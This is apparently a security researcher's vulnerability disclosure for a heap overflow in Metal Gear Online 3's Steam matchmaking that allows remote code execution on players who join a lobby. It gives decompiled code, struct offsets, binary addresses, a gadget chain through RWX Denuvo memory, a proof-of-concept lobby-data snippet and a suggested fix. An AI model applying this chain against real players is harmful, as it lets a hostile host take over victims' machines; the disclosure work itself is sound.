# MGO3 Steam Matchmaking RCE 

06-28-2026

Heap-based buffer overflow in Konami's METAL GEAR ONLINE 3 allows malicious match hosts to remotely execute arbitrary code on lobby members' machines through crafted lobby data.

### Notes
- Referenced function and struct names are guessed and do not match source code.  
Referenced addresses are valid for the latest steam version as of the time of writing this document:   
`mgsvmgo.exe 1.1.2.8/english buildID: 23407568 sha1:C6F6108DB0A6FFF5BEACFAB6773B0CB192527CE7`

## The exploit

In versions `1.1.2.8` and lower of **METAL GEAR ONLINE 3**, the following function is unsafe:

```c
// 1405A2990
void __fastcall parse_kicked_ids(mgo_match_t *mgo_match, steam_id lobby_id)
{
    ISteamMatchmaking *steam_matchmaking;
    const char *kick_num;
    int i;
    steam_id *id;
    ISteamMatchmaking *steam_matchmaking1;
    const char *v8;
    char buffer[64];

    steam_matchmaking = SteamMatchmaking();
    kick_num = steam_matchmaking->GetLobbyData(steam_matchmaking, lobby_id.bits, "kick_num");

    if ( kick_num )
    {
        LODWORD(kick_num) = atoi(kick_num);
    }

    i = 0;
    mgo_match->kick_num = kick_num;

    if ( kick_num > 0 )
    {
        id = mgo_match->kicked_ids;
        do
        {
            sub_140022E50(buffer, 0x40u, "%s_%d", "kicked_id", i);
            steam_matchmaking1 = SteamMatchmaking();
            v8 = steam_matchmaking1->GetLobbyData(steam_matchmaking1, lobby_id, buffer);
            if ( v8 )
            {
                v8 = strtoui64(v8, 0, 10);
            }
            id->bits = v8;
            ++i;
            ++id;
        }
        while ( i < mgo_match->kick_num );
    }
}
```

It iterates the number of kicked players `kick_num` and writes them to `mgo_match_t->kicked_ids` struct, but doesn't check whether the number exceedes `16`, the maximum number of players allowed in a match, which creates a security risk.

The `mgo_match_t` struct looks something like this:

```c
struct steam_callback_t;
struct steam_callback_t
{
    struct vtable
    {
        void run(steam_callback_t*, void* param);
        void run(steam_callback_t*, void* param, bool, int);
        int get_i_callback(steam_callback_t*);
        int get_callback_size(steam_callback_t*);
    };

    vtable* __vftable;
    int callback_flags;
    int i_callback;
    void* arg;
    void* callback;
};

#pragma pack(push, 1)
struct mgo_match_t
{
    char __pad0[13];
    char is_joining_invite;
    steam_id invite_lobby_id;
    char __pad1[2];
    match_settings_t match_settings;
    char __pad2[48];
    __int16 lobby_member_limit;
    char __pad3[90];
    steam_id lobby_owner;
    char __pad4[76];
    steam_id lobby_id;
    char __pad5[1004];
    char st_started;
    char st_is_transition;
    char __pad6[2];
    match_rules_t match_rules;
    steam_id lobby_id2;
    char __pad7[420];
    steam_id kicked_ids[16];
    int kick_num;
    char __pad8[852];
    steam_callback_t on_lobby_data_changed;
    steam_callback_t on_lobby_chat_update;
    steam_callback_t on_lobby_chat_msg;
    steam_callback_t unk_callback1;
    steam_callback_t unk_callback2;
    steam_callback_t unk_callback3;
    char __pad9[8];
};
#pragma pack(pop)
```

As you can tell, `kicked_ids` has a size of 16 and if `kick_num` exceedes that, the following kicked id values will spill over to the rest of the struct. Because both `kick_num` and the individual `kicked_ids` are read from the steam lobby data, which the host has control over, a potential attacker can write anything they want in the struct all the way from the beginning of `kicked_ids` to the end of the struct, which is exactly 1184 bytes in total.  
This probably wouldn't be a big problem since the struct is dynamically allocated (so its address is unpredictable) and that it mostly just stores match information, if it wasn't for the fact that it **also** stores the pointers to the steam callbacks, which the host of the match also has the ability to trigger remotely.  
This means that they can call **any** code they want that is present in the binary, by modifying the callback pointer and manually triggering either `on_lobby_data_changed` using `ISteamMatchmaking::SetLobbyData` or `on_lobby_chat_msg` using `ISteamMatchmaking::SendLobbyChatMsg`. This would already classify as a form of remote code execution (not fully), but it can be taken a step further.  
Like many games out there METAL GEAR ONLINE 3 utilizes Denuvo as part of its anti tampering and digital rights management solutions. One of the key features of Denuvo is code obfuscation, it scrambles the original byte code into a mess that makes it very difficult for a researcher or a modder to understand or debug. For reasons I am still unsure about, Denuvo, and other DRMs like Arxan, have the tendency to set its memory segments that contain this obfuscated code to RWX (read/write/execute) which is unusual because in most scenarios segments that contain code only allow read/execute, while segments that contain data only allow read/write. Allowing all three at once creates a security risk which in this case allows the vulnerability to escalate, opening a path for an attacker to execute whatever code they desire on the victim's machine.
A way to do this would be to take advantage of the `parse_kicked_ids`, and use it to write to other memory, instead of the `mgo_match_t` struct. Its first parameter is said struct, which can actually be any buffer of memory because it doesn't read any meaningful data from it so it has no important requirements that would prevent us from using it in this way. The second argument, on the other hand, is the steam lobby id, which be tricky to pass to it because as of right now we haven't yet achieved **arbitrary** remote code execution, we can only work with the code that is already present in the game, so we have to find a function, or a piece of code that already exists in memory that can help us achieve this.
An example would be the following:

```asm
00000001405A4520 48 8B 02              mov     rax, [rdx]
00000001405A4523 48 89 81 D0 0A 00 00  mov     [rcx+2768], rax
00000001405A452A C3                    retn
```

This is a small function segment that reads the first 8 bytes from `*rdx`, the second argument, and stores it into `*(rcx + 2768)`, the first argument. This is perfect for this scenario, because the callback for `on_lobby_chat_msg` takes as second parameter the `LobbyChatMsg_t` struct that is passed from the steam API, which looks like this:

```c
struct LobbyChatMsg_t
{
	steam_id lobby_id;
	steam_id user_id;
	std::uint8_t chat_entry_type;
	std::uint32_t chat_id;
};
```

As you can see the first 8 bytes of it stores the lobby id, so what we can do is set `on_lobby_chat_msg->callback` to `1405A4520` and `on_lobby_chat_msg->arg` to our custom buffer, offset by whatever place we want to store the steam id in it.

Now, we cannot "call" `parse_kicked_ids` directly, because doing so would not place the lobby id into the second argument, so we have to call its parent function, which reads the it from the mgo match struct `mgo_match_t::lobby_id` (at offset 1532) and then passes it over:

```c
__int64 __fastcall sub_1405A71E0(mgo_match_t *a1)
{
    char st_started;
    char st_is_transition;
    unsigned int pl_total_match;
    steam_id lobby_id;
    void (__fastcall *v6)(__int64, _QWORD, _QWORD);
    void (__fastcall *v7)(__int64, _QWORD, _QWORD);
    __int64 result;

    st_started = a1->st_started;
    st_is_transition = a1->st_is_transition;
    pl_total_match = a1->match_rules.pl_total_match;
    sub_1405A2910(a1, a1->lobby_id2.bits, &a1->st_started);
    sub_1405A23B0(a1, a1->lobby_id2.bits, &a1->match_rules);
    a1->__pad7[1] = a1->match_rules.pl_match_type == 1;

    lobby_id.raw = a1->lobby_id2;   // 
    parse_kicked_ids(a1, lobby_id); // <---------- Here

    if ( st_started != a1->st_started )
    {
        v6 = *&a1->__pad8[716];
        if ( v6 )
        {
            v6(6, 0, *&a1->__pad8[724]);
        }
    }

    if ( !st_is_transition && a1->st_is_transition == 1 )
    {
        v7 = *&a1->__pad8[716];
        if ( v7 )
        {
            v7(8, 0, *&a1->__pad8[724]);
        }
    }

    result = a1->match_rules.pl_total_match;
    if ( pl_total_match < result && result )
    {
        result = *&a1->__pad8[716];
        if ( result )
        {
            return (result)(7, &a1->match_rules, *&a1->__pad8[724]);
        }
    }

    return result;
}
```

Using the `on_lobby_chat_msg` callback we have set earlier we can adjust the pointer to our custom buffer, so that it writes the lobby id at `buffer + 1532`, which would place it exactly where the above function reads it, which, as a result, then passes it onto `parse_kicked_ids`.

The last thing we have to do is note that after calling `parse_kicked_ids` if `buffer + 1444` (st_started) or `buffer + 1445` (st_is_transition) aren't zero, the function will crash because it will try to call a function pointer within our custom buffer which obviously won't be there:

```c
// ...
if ( st_started != a1->st_started )
{
    v6 = *&a1->__pad8[716];
    if ( v6 )
    {
        v6(6, 0, *&a1->__pad8[724]); // invalid callback
    }
}
if ( !st_is_transition && a1->st_is_transition == 1 )
{
    v7 = *&a1->__pad8[716];
    if ( v7 )
    {
        v7(8, 0, *&a1->__pad8[724]); // invalid callback
    }
}
// ...
```

So when we are choosing the address of our buffer (ideally a static address within the game's memory), we need to keep in mind that the memory at `buffer + 1444` has to be 2 consecutive zero bytes. Fortunately this isn't very difficult to do and by doing so it effectively allows us to arbitrarily write any data we want anywhere within the game's memory.  
This includes memory that contains game code, because, like I said earlier, Denuvo allows us to do so because of its segments having read/write/execute permissions, thus finally achieving arbitrary remote code execution.    

## Video demonstration

I have prepared a video that demonstrates what I have stated above, I have attached it along with this document (some parts have been redacted for privacy).  

In the demonstration I launch **2 instances** of the game: 
- **client**/**victim** instance: a completely unmodified version of METAL GEAR ONLINE 3
- **host**/**attacker**: a modified version of the game that is server only (no gui) that runs the exploit.  

Both instances are isolated from each other and **do not communicate** in any way besides the way they normally would through steam networking/matchmaking. In addition, the host instance is run in a sandbox and there are **no other programs** running that could interfere with these two instances or create the behavior shown in the video, all of it happening entirely because of this vulnerability. 

The objective of this video is do demonstrate the existence of this exploit, and in this example I will be using it to:

- Modify the memory at address `145CB89A6` by introducing a jump instruction to code I have injected
- Through said injected code, open a browser window to "https://google.com" by calling `system()`

To verify that the exploit was able to modify the client's memory I use a program called **Cheat Engine** which allows for real time memory analysis.

Steps performed in the video:  

1. Launch the **client/victim** instance
2. Open **Cheat Engine** on the **client/victim** instance and go to address `145CB89A6`, show it is **unmodified**
3. Go in game and open the list of matches, show the host isn't present yet
4. Launch the **host/attacker** instance and wait for it to start up
5. Reload the match list on the client, show that the host is now present being the first one on the list and named "alice"
6. Execute `start_exploit 1` on host console to enable the exploit
7. Join the host from the client instance: **immediately** after this a browser page opens to "google.com" (this is what I programmed the exploit to do, as a demonstration for it)
9. Finally, go back to **Cheat Engine** and show how the code at the address `145CB89A6` has **changed**, without having done anything but joining the host's match

This proves that the exploit does indeed exist.

## Proof of concept

Since this exploit works exclusively through Steam Matchmaking data, I will only be showing a short snipped of code that sets some key, value pairs for the lobby data that are required for the exploit, in this case it will simply set the memory at `0x141F97D20` to `0xAAAAAAAAAAAAAAAA`.  

```c++
// address to our custom buffer
// it has to be [place we want to write] - 1960
// 1960: offset of kicked_ids in mgo_match_t
auto our_custom_buf = 0x141F97D20 - 1960;

// the memory at 0x141F97D20 is all zeros, 
// so we dont have to check to make sure the bytes for
// st_started or st_is_started are zero

// 1532: offset of lobby_id in mgo_match_t
// 2768: offset used in the small function segment that stores is used to store the lobby_id
auto steam_id_write_rel_off = 1532 - 2768;

mgo_match_t* mgo_match = ... // address to the mgo match on the host

auto kick_num_ptr = &mgo_match->kick_num;
auto ptr = &mgo_match->kicked_ids[0];
auto count = 135;

// since all values are overwritten, we copy the ones we dont 
// have to modify (flags, and other static values) from our 
// instance of the mgo match, so the client's mgo match won't be broken
set_lobby_data("kick_num", count);
for (auto i = 0; i < count; i++)
{
	auto value = *reinterpret_cast<size_t*>(ptr);
	if (ptr == kick_num_ptr)
	{
		value = count;
	}

	if (value != 0)
	{
		set_lobby_data(va("kicked_id_%i", i), va("%lli", value));
	}

	ptr += 8;
}


// on_lobby_data_changed handler
set_lobby_data("kicked_id_124", va("%lli", 0)); // flags
set_lobby_data("kicked_id_125", va("%lli", our_custom_buf)); // argument
set_lobby_data("kicked_id_126", va("%lli", 0x1405A71E0)); // callback 
// 0x1405A71E0: caller of parse_kicked_ids

// on_lobby_chat_msg handler
set_lobby_data("kicked_id_132", va("%lli", 0)); // flags
set_lobby_data("kicked_id_133", va("%lli", our_custom_buf + steam_id_write_rel_off)); // arg
set_lobby_data("kicked_id_134", va("%lli", 0x1405A4520)); // callback

// write the data to 0x141F97D20
set_lobby_data("kicked_id_0", va("%lli", 0xAAAAAAAAAAAAAAAA));

// trigger lobby chat msg callback
send_lobby_chat_msg("ABCDEF");
```

## The fix

Fixing this vulnerability simply requires capping `kick_num` to 16 in `parse_kicked_ids` (there are 2 instances of this function in the game). Alternatively something like ASLR (Address Space Layout Randomization) enabled would also have prevented this from happening.

## Conclusion

I would rate this vulnerability a 9/10, because it would allow a malicious match host to execute ANY code they want on all of the players' machines (and lets them install malware, or remote access tools, or literally anything), with very little effort and only requiring the victim to click to join their lobby, or in the case that the attacker gains host privileges after host migration, it would require no interaction at all. I would suggest that it is fixed ASAP.
